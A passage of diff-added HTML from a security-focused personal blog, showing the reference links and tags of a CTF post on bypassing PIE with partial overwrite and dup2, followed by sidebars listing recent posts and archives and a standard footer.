+<li><a href="http://blog.51cto.com/duallay/1876841" target="_blank" rel="noopener">http://blog.51cto.com/duallay/1876841</a></li>
+<li><a href="https://zoepla.github.io/2018/07/_pie_%E7%88%86%E7%A0%B4ebx+dup2/" target="_blank" rel="noopener">https://zoepla.github.io/2018/07/_pie_%E7%88%86%E7%A0%B4ebx+dup2/</a></li>
+<li><a href="http://man7.org/linux/man-pages/man2/dup.2.html" target="_blank" rel="noopener">http://man7.org/linux/man-pages/man2/dup.2.html</a></li>
+<li><a href="https://blog.csdn.net/silent123go/article/details/71108501" target="_blank" rel="noopener">https://blog.csdn.net/silent123go/article/details/71108501</a></li>
+</ul>
+
+        </div>
+        
+        <div class="level is-size-7 is-uppercase">
+            <div class="level-start">
+                <div class="level-item">
+                    <span class="is-size-6 has-text-grey has-mr-7">#</span>
+                    <a class="has-link-grey -link" href="/tags/CTF/">CTF</a>, <a class="has-link-grey -link" href="/tags/bypass-pie/">bypass pie</a>
+                </div>
+            </div>
+        </div>
+        
+        
+        
+    </div>
+</div>
+
+
+<div class="card card-transparent">
+    <div class="level post-navigation is-flex-wrap is-mobile">
+        
+        
+        <div class="level-end">
+            <a class="level level-item has-link-grey  article-nav-next" href="/2018/11/got-plt-study/">
+                <span class="level-item">got/plt表学习</span>
+                <i class="level-item fas fa-chevron-right"></i>
+            </a>
+        </div>
+        
+    </div>
+</div>
+
+
+</div>
+                
+
+
+
+<div class="column is-4-tablet is-4-desktop is-3-widescreen  has-order-1 column-left">
+    
+        
+<div class="card widget">
+    <div class="card-content">
+        <nav class="level">
+            <div class="level-item has-text-centered">
+                <div>
+                    <img class="image is-128x128 has-mb-6" src="/images/avatar.png" alt="Junay">
+                    
+                    <p class="is-size-4 is-block">
+                        Junay
+                    </p>
+                    
+                    
+                    <p class="is-size-6 is-block">
+                        Junay&#39;s blog
+                    </p>
+                    
+                    
+                    <p class="is-size-6 is-flex is-flex-center has-text-grey">
+                        <i class="fas fa-map-marker-alt has-mr-7"></i>
+                        <span>Shanghai</span>
+                    </p>
+                    
+                </div>
+            </div>
+        </nav>
+        <nav class="level is-mobile">
+            <div class="level-item has-text-centered is-marginless">
+                <div>
+                    <p class="heading">
+                        文章
+                    </p>
+                    <p class="title has-text-weight-normal">
+                        56
+                    </p>
+                </div>
+            </div>
+            <div class="level-item has-text-centered is-marginless">
+                <div>
+                    <p class="heading">
+                        分类
+                    </p>
+                    <p class="title has-text-weight-normal">
+                        2
+                    </p>
+                </div>
+            </div>
+            <div class="level-item has-text-centered is-marginless">
+                <div>
+                    <p class="heading">
+                        标签
+                    </p>
+                    <p class="title has-text-weight-normal">
+                        18
+                    </p>
+                </div>
+            </div>
+        </nav>
+        <div class="level">
+            <a class="level-item button is-link is-rounded" href="https://github.com/delcoding">
+                关注我</a>
+        </div>
+        
+        
+        <div class="level is-mobile">
+            
+            <a class="level-item button is-white is-marginless" target="_blank"
+                title="Github" href="https://github.com/delcoding">
+                
+                <i class="fab fa-github"></i>
+                
+            </a>
+            
+            <a class="level-item button is-white is-marginless" target="_blank"
+                title="Facebook" href="http://facebook.com">
+                
+                <i class="fab fa-facebook"></i>
+                
+            </a>
+            
+            <a class="level-item button is-white is-marginless" target="_blank"
+                title="Twitter" href="http://twitter.com">
+                
+                <i class="fab fa-twitter"></i>
+                
+            </a>
+            
+            <a class="level-item button is-white is-marginless" target="_blank"
+                title="Dribbble" href="http://dribbble.com">
+                
+                <i class="fab fa-dribbble"></i>
+                
+            </a>
+            
+            <a class="level-item button is-white is-marginless" target="_blank"
+                title="RSS" href="/">
+                
+                <i class="fas fa-rss"></i>
+                
+            </a>
+            
+        </div>
+        
+    </div>
+</div>
+    
+        
+    
+        
+
+
+    
+        
+<div class="card widget">
+    <div class="card-content">
+        <div class="menu">
+            <h3 class="menu-label">
+                分类
+            </h3>
+            <ul class="menu-list">
+            <li>
+        <a class="level is-marginless" href="/categories/CTF/">
+            <span class="level-start">
+                <span class="level-item">CTF</span>
+            </span>
+            <span class="level-end">
+                <span class="level-item tag">7</span>
+            </span>
+        </a></li><li>
+        <a class="level is-marginless" href="/categories/jekyll-update/">
+            <span class="level-start">
+                <span class="level-item">jekyll update</span>
+            </span>
+            <span class="level-end">
+                <span class="level-item tag">27</span>
+            </span>
+        </a></li>
+            </ul>
+        </div>
+    </div>
+</div>
+    
+        
+<div class="card widget">
+    <div class="card-content">
+        <h3 class="menu-label">
+            标签云
+        </h3>
+        <a href="/tags/BlockChain/" style="font-size: 10px;">BlockChain</a> <a href="/tags/CTF/" style="font-size: 20px;">CTF</a> <a href="/tags/CVE/" style="font-size: 16.67px;">CVE</a> <a href="/tags/Hack/" style="font-size: 10px;">Hack</a> <a href="/tags/Oracle/" style="font-size: 10px;">Oracle</a> <a href="/tags/bypass-pie/" style="font-size: 10px;">bypass pie</a> <a href="/tags/kali/" style="font-size: 13.33px;">kali</a> <a href="/tags/mongodb/" style="font-size: 10px;">mongodb</a> <a href="/tags/office/" style="font-size: 16.67px;">office</a> <a href="/tags/pwn/" style="font-size: 10px;">pwn</a> <a href="/tags/web3/" style="font-size: 10px;">web3</a> <a href="/tags/windows/" style="font-size: 10px;">windows</a> <a href="/tags/writeup/" style="font-size: 10px;">writeup</a> <a href="/tags/xammpp/" style="font-size: 10px;">xammpp</a> <a href="/tags/xdebug/" style="font-size: 10px;">xdebug</a> <a href="/tags/爬虫绕过/" style="font-size: 10px;">爬虫绕过</a> <a href="/tags/百度云/" style="font-size: 10px;">百度云</a> <a href="/tags/笔记/" style="font-size: 10px;">笔记</a>
+    </div>
+</div>
+
+    
+    
+        <div class="card card-transparent is-hidden-widescreen">
+        
+            
+<div class="card widget">
+    <div class="card-content">
+        <h3 class="menu-label">
+            最新文章
+        </h3>
+        
+        <article class="media">
+            
+            <a href="/2018/11/pie-bypass-overwrite-dup2/" class="media-left">
+                <p class="image is-64x64">
+                    <img class="thumbnail" src="/images/thumbnail.svg" alt="bypass pie use partial overwrite and dup2">
+                </p>
+            </a>
+            
+            <div class="media-content">
+                <div class="content">
+                    <div><time class="has-text-grey is-size-7 is-uppercase" datetime="2018-11-23T08:47:56.000Z">2018-11-23</time></div>
+                    <a href="/2018/11/pie-bypass-overwrite-dup2/" class="has-link-black-ter is-size-6">bypass pie use partial overwrite and dup2</a>
+                    <p class="is-size-7 is-uppercase">
+                        
+                    </p>
+                </div>
+            </div>
+        </article>
+        
+        <article class="media">
+            
+            <a href="/2018/11/got-plt-study/" class="media-left">
+                <p class="image is-64x64">
+                    <img class="thumbnail" src="/images/thumbnail.svg" alt="got/plt表学习">
+                </p>
+            </a>
+            
+            <div class="media-content">
+                <div class="content">
+                    <div><time class="has-text-grey is-size-7 is-uppercase" datetime="2018-11-21T14:47:56.000Z">2018-11-21</time></div>
+                    <a href="/2018/11/got-plt-study/" class="has-link-black-ter is-size-6">got/plt表学习</a>
+                    <p class="is-size-7 is-uppercase">
+                        
+                    </p>
+                </div>
+            </div>
+        </article>
+        
+        <article class="media">
+            
+            <a href="/2018/11/seccon2018-web-writeup/" class="media-left">
+                <p class="image is-64x64">
+                    <img class="thumbnail" src="/images/thumbnail.svg" alt="SECCON 2018 GhostKingdom writeup">
+                </p>
+            </a>
+            
+            <div class="media-content">
+                <div class="content">
+                    <div><time class="has-text-grey is-size-7 is-uppercase" datetime="2018-11-01T03:47:56.000Z">2018-11-01</time></div>
+                    <a href="/2018/11/seccon2018-web-writeup/" class="has-link-black-ter is-size-6">SECCON 2018 GhostKingdom writeup</a>
+                    <p class="is-size-7 is-uppercase">
+                        
+                    </p>
+                </div>
+            </div>
+        </article>
+        
+        <article class="media">
+            
+            <a href="/2018/10/Nginx-nodejs-socket/" class="media-left">
+                <p class="image is-64x64">
+                    <img class="thumbnail" src="/images/thumbnail.svg" alt="【笔记】部署nodejs+socket.io+nginx (https)">
+                </p>
+            </a>
+            
+            <div class="media-content">
+                <div class="content">
+                    <div><time class="has-text-grey is-size-7 is-uppercase" datetime="2018-10-12T08:47:56.000Z">2018-10-12</time></div>
+                    <a href="/2018/10/Nginx-nodejs-socket/" class="has-link-black-ter is-size-6">【笔记】部署nodejs+socket.io+nginx (https)</a>
+                    <p class="is-size-7 is-uppercase">
+                        
+                    </p>
+                </div>
+            </div>
+        </article>
+        
+        <article class="media">
+            
+            <a href="/2018/10/oracle-sqli-get-shell/" class="media-left">
+                <p class="image is-64x64">
+                    <img class="thumbnail" src="/images/thumbnail.svg" alt="Oracle 从sqli到get (root) shell">
+                </p>
+            </a>
+            
+            <div class="media-content">
+                <div class="content">
+                    <div><time class="has-text-grey is-size-7 is-uppercase" datetime="2018-10-02T08:47:56.000Z">2018-10-02</time></div>
+                    <a href="/2018/10/oracle-sqli-get-shell/" class="has-link-black-ter is-size-6">Oracle 从sqli到get (root) shell</a>
+                    <p class="is-size-7 is-uppercase">
+                        
+                    </p>
+                </div>
+            </div>
+        </article>
+        
+    </div>
+</div>
+
+        
+            <div class="card widget">
+    <div class="card-content">
+        <div class="menu">
+        <h3 class="menu-label">
+            归档
+        </h3>
+        <ul class="menu-list">
+        
+        <li>
+            <a class="level is-marginless" href="/archives/2018/11/">
+                <span class="level-start">
+                    <span class="level-item">十一月 2018</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">3</span>
+                </span>
+            </a>
+        </li>
+        
+        <li>
+            <a class="level is-marginless" href="/archives/2018/10/">
+                <span class="level-start">
+                    <span class="level-item">十月 2018</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">2</span>
+                </span>
+            </a>
+        </li>
+        
+        <li>
+            <a class="level is-marginless" href="/archives/2018/09/">
+                <span class="level-start">
+                    <span class="level-item">九月 2018</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">5</span>
+                </span>
+            </a>
+        </li>
+        
+        <li>
+            <a class="level is-marginless" href="/archives/2018/06/">
+                <span class="level-start">
+                    <span class="level-item">六月 2018</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">1</span>
+                </span>
+            </a>
+        </li>
+        
+        <li>
+            <a class="level is-marginless" href="/archives/2018/05/">
+                <span class="level-start">
+                    <span class="level-item">五月 2018</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">6</span>
+                </span>
+            </a>
+        </li>
+        
+        <li>
+            <a class="level is-marginless" href="/archives/2018/04/">
+                <span class="level-start">
+                    <span class="level-item">四月 2018</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">6</span>
+                </span>
+            </a>
+        </li>
+        
+        <li>
+            <a class="level is-marginless" href="/archives/2018/03/">
+                <span class="level-start">
+                    <span class="level-item">三月 2018</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">14</span>
+                </span>
+            </a>
+        </li>
+        
+        <li>
+            <a class="level is-marginless" href="/archives/2018/02/">
+                <span class="level-start">
+                    <span class="level-item">二月 2018</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">1</span>
+                </span>
+            </a>
+        </li>
+        
+        <li>
+            <a class="level is-marginless" href="/archives/2018/01/">
+                <span class="level-start">
+                    <span class="level-item">一月 2018</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">3</span>
+                </span>
+            </a>
+        </li>
+        
+        <li>
+            <a class="level is-marginless" href="/archives/2017/12/">
+                <span class="level-start">
+                    <span class="level-item">十二月 2017</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">6</span>
+                </span>
+            </a>
+        </li>
+        
+        <li>
+            <a class="level is-marginless" href="/archives/2017/11/">
+                <span class="level-start">
+                    <span class="level-item">十一月 2017</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">9</span>
+                </span>
+            </a>
+        </li>
+        
+        </ul>
+        </div>
+    </div>
+</div>
+        
+            <div class="card widget">
+    <div class="card-content">
+        <div class="menu">
+            <h3 class="menu-label">
+                标签
+            </h3>
+            <ul class="menu-list">
+                
+                <li>
+                    <a class="level is-marginless" href="/tags/BlockChain/">
+                        <span class="level-start">
+                            <span class="level-item">BlockChain</span>
+                        </span>
+                        <span class="level-end">
+                            <span class="level-item tag">1</span>
+                        </span>
+                    </a>
+                </li>
+                
+                <li>
+                    <a class="level is-marginless" href="/tags/CTF/">
+                        <span class="level-start">
+                            <span class="level-item">CTF</span>
+                        </span>
+                        <span class="level-end">
+                            <span class="level-item tag">12</span>
+                        </span>
+                    </a>
+                </li>
+                
+                <li>
+                    <a class="level is-marginless" href="/tags/CVE/">
+                        <span class="level-start">
+                            <span class="level-item">CVE</span>
+                        </span>
+                        <span class="level-end">
+                            <span class="level-item tag">3</span>
+                        </span>
+                    </a>
+                </li>
+                
+                <li>
+                    <a class="level is-marginless" href="/tags/Hack/">
+                        <span class="level-start">
+                            <span class="level-item">Hack</span>
+                        </span>
+                        <span class="level-end">
+                            <span class="level-item tag">1</span>
+                        </span>
+                    </a>
+                </li>
+                
+                <li>
+                    <a class="level is-marginless" href="/tags/Oracle/">
+                        <span class="level-start">
+                            <span class="level-item">Oracle</span>
+                        </span>
+                        <span class="level-end">
+                            <span class="level-item tag">1</span>
+                        </span>
+                    </a>
+                </li>
+                
+                <li>
+                    <a class="level is-marginless" href="/tags/bypass-pie/">
+                        <span class="level-start">
+                            <span class="level-item">bypass pie</span>
+                        </span>
+                        <span class="level-end">
+                            <span class="level-item tag">1</span>
+                        </span>
+                    </a>
+                </li>
+                
+                <li>
+                    <a class="level is-marginless" href="/tags/kali/">
+                        <span class="level-start">
+                            <span class="level-item">kali</span>
+                        </span>
+                        <span class="level-end">
+                            <span class="level-item tag">2</span>
+                        </span>
+                    </a>
+                </li>
+                
+                <li>
+                    <a class="level is-marginless" href="/tags/mongodb/">
+                        <span class="level-start">
+                            <span class="level-item">mongodb</span>
+                        </span>
+                        <span class="level-end">
+                            <span class="level-item tag">1</span>
+                        </span>
+                    </a>
+                </li>
+                
+                <li>
+                    <a class="level is-marginless" href="/tags/office/">
+                        <span class="level-start">
+                            <span class="level-item">office</span>
+                        </span>
+                        <span class="level-end">
+                            <span class="level-item tag">3</span>
+                        </span>
+                    </a>
+                </li>
+                
+                <li>
+                    <a class="level is-marginless" href="/tags/pwn/">
+                        <span class="level-start">
+                            <span class="level-item">pwn</span>
+                        </span>
+                        <span class="level-end">
+                            <span class="level-item tag">1</span>
+                        </span>
+                    </a>
+                </li>
+                
+                <li>
+                    <a class="level is-marginless" href="/tags/web3/">
+                        <span class="level-start">
+                            <span class="level-item">web3</span>
+                        </span>
+                        <span class="level-end">
+                            <span class="level-item tag">1</span>
+                        </span>
+                    </a>
+                </li>
+                
+                <li>
+                    <a class="level is-marginless" href="/tags/windows/">
+                        <span class="level-start">
+                            <span class="level-item">windows</span>
+                        </span>
+                        <span class="level-end">
+                            <span class="level-item tag">1</span>
+                        </span>
+                    </a>
+                </li>
+                
+                <li>
+                    <a class="level is-marginless" href="/tags/writeup/">
+                        <span class="level-start">
+                            <span class="level-item">writeup</span>
+                        </span>
+                        <span class="level-end">
+                            <span class="level-item tag">1</span>
+                        </span>
+                    </a>
+                </li>
+                
+                <li>
+                    <a class="level is-marginless" href="/tags/xammpp/">
+                        <span class="level-start">
+                            <span class="level-item">xammpp</span>
+                        </span>
+                        <span class="level-end">
+                            <span class="level-item tag">1</span>
+                        </span>
+                    </a>
+                </li>
+                
+                <li>
+                    <a class="level is-marginless" href="/tags/xdebug/">
+                        <span class="level-start">
+                            <span class="level-item">xdebug</span>
+                        </span>
+                        <span class="level-end">
+                            <span class="level-item tag">1</span>
+                        </span>
+                    </a>
+                </li>
+                
+                <li>
+                    <a class="level is-marginless" href="/tags/爬虫绕过/">
+                        <span class="level-start">
+                            <span class="level-item">爬虫绕过</span>
+                        </span>
+                        <span class="level-end">
+                            <span class="level-item tag">1</span>
+                        </span>
+                    </a>
+                </li>
+                
+                <li>
+                    <a class="level is-marginless" href="/tags/百度云/">
+                        <span class="level-start">
+                            <span class="level-item">百度云</span>
+                        </span>
+                        <span class="level-end">
+                            <span class="level-item tag">1</span>
+                        </span>
+                    </a>
+                </li>
+                
+                <li>
+                    <a class="level is-marginless" href="/tags/笔记/">
+                        <span class="level-start">
+                            <span class="level-item">笔记</span>
+                        </span>
+                        <span class="level-end">
+                            <span class="level-item tag">1</span>
+                        </span>
+                    </a>
+                </li>
+                
+            </ul>
+        </div>
+    </div>
+</div>
+        
+        </div>
+    
+</div>
+
+                
+
+
+
+<div class="column is-4-tablet is-4-desktop is-3-widescreen is-hidden-touch is-hidden-desktop-only has-order-3 column-right">
+    
+        
+<div class="card widget">
+    <div class="card-content">
+        <h3 class="menu-label">
+            最新文章
+        </h3>
+        
+        <article class="media">
+            
+            <a href="/2018/11/pie-bypass-overwrite-dup2/" class="media-left">
+                <p class="image is-64x64">
+                    <img class="thumbnail" src="/images/thumbnail.svg" alt="bypass pie use partial overwrite and dup2">
+                </p>
+            </a>
+            
+            <div class="media-content">
+                <div class="content">
+                    <div><time class="has-text-grey is-size-7 is-uppercase" datetime="2018-11-23T08:47:56.000Z">2018-11-23</time></div>
+                    <a href="/2018/11/pie-bypass-overwrite-dup2/" class="has-link-black-ter is-size-6">bypass pie use partial overwrite and dup2</a>
+                    <p class="is-size-7 is-uppercase">
+                        
+                    </p>
+                </div>
+            </div>
+        </article>
+        
+        <article class="media">
+            
+            <a href="/2018/11/got-plt-study/" class="media-left">
+                <p class="image is-64x64">
+                    <img class="thumbnail" src="/images/thumbnail.svg" alt="got/plt表学习">
+                </p>
+            </a>
+            
+            <div class="media-content">
+                <div class="content">
+                    <div><time class="has-text-grey is-size-7 is-uppercase" datetime="2018-11-21T14:47:56.000Z">2018-11-21</time></div>
+                    <a href="/2018/11/got-plt-study/" class="has-link-black-ter is-size-6">got/plt表学习</a>
+                    <p class="is-size-7 is-uppercase">
+                        
+                    </p>
+                </div>
+            </div>
+        </article>
+        
+        <article class="media">
+            
+            <a href="/2018/11/seccon2018-web-writeup/" class="media-left">
+                <p class="image is-64x64">
+                    <img class="thumbnail" src="/images/thumbnail.svg" alt="SECCON 2018 GhostKingdom writeup">
+                </p>
+            </a>
+            
+            <div class="media-content">
+                <div class="content">
+                    <div><time class="has-text-grey is-size-7 is-uppercase" datetime="2018-11-01T03:47:56.000Z">2018-11-01</time></div>
+                    <a href="/2018/11/seccon2018-web-writeup/" class="has-link-black-ter is-size-6">SECCON 2018 GhostKingdom writeup</a>
+                    <p class="is-size-7 is-uppercase">
+                        
+                    </p>
+                </div>
+            </div>
+        </article>
+        
+        <article class="media">
+            
+            <a href="/2018/10/Nginx-nodejs-socket/" class="media-left">
+                <p class="image is-64x64">
+                    <img class="thumbnail" src="/images/thumbnail.svg" alt="【笔记】部署nodejs+socket.io+nginx (https)">
+                </p>
+            </a>
+            
+            <div class="media-content">
+                <div class="content">
+                    <div><time class="has-text-grey is-size-7 is-uppercase" datetime="2018-10-12T08:47:56.000Z">2018-10-12</time></div>
+                    <a href="/2018/10/Nginx-nodejs-socket/" class="has-link-black-ter is-size-6">【笔记】部署nodejs+socket.io+nginx (https)</a>
+                    <p class="is-size-7 is-uppercase">
+                        
+                    </p>
+                </div>
+            </div>
+        </article>
+        
+        <article class="media">
+            
+            <a href="/2018/10/oracle-sqli-get-shell/" class="media-left">
+                <p class="image is-64x64">
+                    <img class="thumbnail" src="/images/thumbnail.svg" alt="Oracle 从sqli到get (root) shell">
+                </p>
+            </a>
+            
+            <div class="media-content">
+                <div class="content">
+                    <div><time class="has-text-grey is-size-7 is-uppercase" datetime="2018-10-02T08:47:56.000Z">2018-10-02</time></div>
+                    <a href="/2018/10/oracle-sqli-get-shell/" class="has-link-black-ter is-size-6">Oracle 从sqli到get (root) shell</a>
+                    <p class="is-size-7 is-uppercase">
+                        
+                    </p>
+                </div>
+            </div>
+        </article>
+        
+    </div>
+</div>
+
+    
+        <div class="card widget">
+    <div class="card-content">
+        <div class="menu">
+        <h3 class="menu-label">
+            归档
+        </h3>
+        <ul class="menu-list">
+        
+        <li>
+            <a class="level is-marginless" href="/archives/2018/11/">
+                <span class="level-start">
+                    <span class="level-item">十一月 2018</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">3</span>
+                </span>
+            </a>
+        </li>
+        
+        <li>
+            <a class="level is-marginless" href="/archives/2018/10/">
+                <span class="level-start">
+                    <span class="level-item">十月 2018</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">2</span>
+                </span>
+            </a>
+        </li>
+        
+        <li>
+            <a class="level is-marginless" href="/archives/2018/09/">
+                <span class="level-start">
+                    <span class="level-item">九月 2018</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">5</span>
+                </span>
+            </a>
+        </li>
+        
+        <li>
+            <a class="level is-marginless" href="/archives/2018/06/">
+                <span class="level-start">
+                    <span class="level-item">六月 2018</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">1</span>
+                </span>
+            </a>
+        </li>
+        
+        <li>
+            <a class="level is-marginless" href="/archives/2018/05/">
+                <span class="level-start">
+                    <span class="level-item">五月 2018</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">6</span>
+                </span>
+            </a>
+        </li>
+        
+        <li>
+            <a class="level is-marginless" href="/archives/2018/04/">
+                <span class="level-start">
+                    <span class="level-item">四月 2018</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">6</span>
+                </span>
+            </a>
+        </li>
+        
+        <li>
+            <a class="level is-marginless" href="/archives/2018/03/">
+                <span class="level-start">
+                    <span class="level-item">三月 2018</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">14</span>
+                </span>
+            </a>
+        </li>
+        
+        <li>
+            <a class="level is-marginless" href="/archives/2018/02/">
+                <span class="level-start">
+                    <span class="level-item">二月 2018</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">1</span>
+                </span>
+            </a>
+        </li>
+        
+        <li>
+            <a class="level is-marginless" href="/archives/2018/01/">
+                <span class="level-start">
+                    <span class="level-item">一月 2018</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">3</span>
+                </span>
+            </a>
+        </li>
+        
+        <li>
+            <a class="level is-marginless" href="/archives/2017/12/">
+                <span class="level-start">
+                    <span class="level-item">十二月 2017</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">6</span>
+                </span>
+            </a>
+        </li>
+        
+        <li>
+            <a class="level is-marginless" href="/archives/2017/11/">
+                <span class="level-start">
+                    <span class="level-item">十一月 2017</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">9</span>
+                </span>
+            </a>
+        </li>
+        
+        </ul>
+        </div>
+    </div>
+</div>
+    
+        <div class="card widget">
+    <div class="card-content">
+        <div class="menu">
+            <h3 class="menu-label">
+                标签
+            </h3>
+            <ul class="menu-list">
+                
+                <li>
+                    <a class="level is-marginless" href="/tags/BlockChain/">
+                        <span class="level-start">
+                            <span class="level-item">BlockChain</span>
+                        </span>
+                        <span class="level-end">
+                            <span class="level-item tag">1</span>
+                        </span>
+                    </a>
+                </li>
+                
+                <li>
+                    <a class="level is-marginless" href="/tags/CTF/">
+                        <span class="level-start">
+                            <span class="level-item">CTF</span>
+                        </span>
+                        <span class="level-end">
+                            <span class="level-item tag">12</span>
+                        </span>
+                    </a>
+                </li>
+                
+                <li>
+                    <a class="level is-marginless" href="/tags/CVE/">
+                        <span class="level-start">
+                            <span class="level-item">CVE</span>
+                        </span>
+                        <span class="level-end">
+                            <span class="level-item tag">3</span>
+                        </span>
+                    </a>
+                </li>
+                
+                <li>
+                    <a class="level is-marginless" href="/tags/Hack/">
+                        <span class="level-start">
+                            <span class="level-item">Hack</span>
+                        </span>
+                        <span class="level-end">
+                            <span class="level-item tag">1</span>
+                        </span>
+                    </a>
+                </li>
+                
+                <li>
+                    <a class="level is-marginless" href="/tags/Oracle/">
+                        <span class="level-start">
+                            <span class="level-item">Oracle</span>
+                        </span>
+                        <span class="level-end">
+                            <span class="level-item tag">1</span>
+                        </span>
+                    </a>
+                </li>
+                
+                <li>
+                    <a class="level is-marginless" href="/tags/bypass-pie/">
+                        <span class="level-start">
+                            <span class="level-item">bypass pie</span>
+                        </span>
+                        <span class="level-end">
+                            <span class="level-item tag">1</span>
+                        </span>
+                    </a>
+                </li>
+                
+                <li>
+                    <a class="level is-marginless" href="/tags/kali/">
+                        <span class="level-start">
+                            <span class="level-item">kali</span>
+                        </span>
+                        <span class="level-end">
+                            <span class="level-item tag">2</span>
+                        </span>
+                    </a>
+                </li>
+                
+                <li>
+                    <a class="level is-marginless" href="/tags/mongodb/">
+                        <span class="level-start">
+                            <span class="level-item">mongodb</span>
+                        </span>
+                        <span class="level-end">
+                            <span class="level-item tag">1</span>
+                        </span>
+                    </a>
+                </li>
+                
+                <li>
+                    <a class="level is-marginless" href="/tags/office/">
+                        <span class="level-start">
+                            <span class="level-item">office</span>
+                        </span>
+                        <span class="level-end">
+                            <span class="level-item tag">3</span>
+                        </span>
+                    </a>
+                </li>
+                
+                <li>
+                    <a class="level is-marginless" href="/tags/pwn/">
+                        <span class="level-start">
+                            <span class="level-item">pwn</span>
+                        </span>
+                        <span class="level-end">
+                            <span class="level-item tag">1</span>
+                        </span>
+                    </a>
+                </li>
+                
+                <li>
+                    <a class="level is-marginless" href="/tags/web3/">
+                        <span class="level-start">
+                            <span class="level-item">web3</span>
+                        </span>
+                        <span class="level-end">
+                            <span class="level-item tag">1</span>
+                        </span>
+                    </a>
+                </li>
+                
+                <li>
+                    <a class="level is-marginless" href="/tags/windows/">
+                        <span class="level-start">
+                            <span class="level-item">windows</span>
+                        </span>
+                        <span class="level-end">
+                            <span class="level-item tag">1</span>
+                        </span>
+                    </a>
+                </li>
+                
+                <li>
+                    <a class="level is-marginless" href="/tags/writeup/">
+                        <span class="level-start">
+                            <span class="level-item">writeup</span>
+                        </span>
+                        <span class="level-end">
+                            <span class="level-item tag">1</span>
+                        </span>
+                    </a>
+                </li>
+                
+                <li>
+                    <a class="level is-marginless" href="/tags/xammpp/">
+                        <span class="level-start">
+                            <span class="level-item">xammpp</span>
+                        </span>
+                        <span class="level-end">
+                            <span class="level-item tag">1</span>
+                        </span>
+                    </a>
+                </li>
+                
+                <li>
+                    <a class="level is-marginless" href="/tags/xdebug/">
+                        <span class="level-start">
+                            <span class="level-item">xdebug</span>
+                        </span>
+                        <span class="level-end">
+                            <span class="level-item tag">1</span>
+                        </span>
+                    </a>
+                </li>
+                
+                <li>
+                    <a class="level is-marginless" href="/tags/爬虫绕过/">
+                        <span class="level-start">
+                            <span class="level-item">爬虫绕过</span>
+                        </span>
+                        <span class="level-end">
+                            <span class="level-item tag">1</span>
+                        </span>
+                    </a>
+                </li>
+                
+                <li>
+                    <a class="level is-marginless" href="/tags/百度云/">
+                        <span class="level-start">
+                            <span class="level-item">百度云</span>
+                        </span>
+                        <span class="level-end">
+                            <span class="level-item tag">1</span>
+                        </span>
+                    </a>
+                </li>
+                
+                <li>
+                    <a class="level is-marginless" href="/tags/笔记/">
+                        <span class="level-start">
+                            <span class="level-item">笔记</span>
+                        </span>
+                        <span class="level-end">
+                            <span class="level-item tag">1</span>
+                        </span>
+                    </a>
+                </li>
+                
+            </ul>
+        </div>
+    </div>
+</div>
+    
+    
+</div>
+
+            </div>
+        </div>
+    </section>
+    <footer class="footer">
+    <div class="container">
+        <div class="level">
+            <div class="level-start has-text-centered-mobile">
+                <a class="footer-logo is-block has-mb-6" href="/">
+                
+                    <img src="/images/logo.svg" alt="bypass pie use partial overwrite and dup2" height="28">
+                
+                </a>
+                <p class="is-size-7">
+                &copy; 2018 Junay&nbsp;
+                Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> & <a
+                        href="http://github.com/ppoffice/hexo-theme-icarus">Icarus</a>
+                </p>
+            </div>
+            <div class="level-end">
+            
+                <div class="field has-addons is-flex-center-mobile has-mt-5-mobile is-flex-wrap is-flex-middle">
+                
+                
+                <p class="control">
+                    <a class="button is-white is-large" target="_blank" title="Creative Commons" href="https://creativecommons.org/">
+                        
+                        <i class="fab fa-creative-commons"></i>
+                        
+                    </a>
+                </p>
+                
+                <p class="control">
+                    <a class="button is-white is-large" target="_blank" title="Attribution 4.0 International" href="https://creativecommons.org/licenses/by/4.0/">
+                        
+                        <i class="fab fa-creative-commons-by"></i>
+                        
+                    </a>
+                </p>
+                
+                <p class="control">
+                    <a class="button is-white is-large" target="_blank" title="Download on GitHub" href="https://github.com/delcoding">
+                        
+                        <i class="fab fa-github"></i>
+                        
+                    </a>
+                </p>
+                
+                </div>
+            
+            </div>
+        </div>
+    </div>
+</footer>
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/moment@2.22.2/min/moment-with-locales.min.js"></script>
+<script>moment.locale("zh-CN");</script>
+
+
+    
+    
+    
+    <script src="/js/animation.js"></script>
+    
+
+    
+    
+    
+    <script src="https://cdn.jsdelivr.net/npm/lightgallery@1.6.8/dist/js/lightgallery.min.js" defer></script>
+    <script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/js/jquery.justifiedGallery.min.js" defer></script>
+    <script src="/js/gallery.js" defer></script>
+    
+
+    
+    
+
+<div id="outdated">
+    <h6>Your browser is out-of-date!</h6>
+    <p>Update your browser to view this website correctly. <a id="btnUpdateBrowser" href="http://outdatedbrowser.com/">Update
+            my browser now </a></p>
+    <p class="last"><a href="#" id="btnCloseUpdateBrowser" title="Close">&times;</a></p>
+</div>
+<script src="https://cdn.jsdelivr.net/npm/outdatedbrowser@1.1.5/outdatedbrowser/outdatedbrowser.min.js" defer></script>
+<script>
+    document.addEventListener("DOMContentLoaded", function () {
+        outdatedBrowser({
+            bgColor: '#f25648',
+            color: '#ffffff',
+            lowerThan: 'flex'
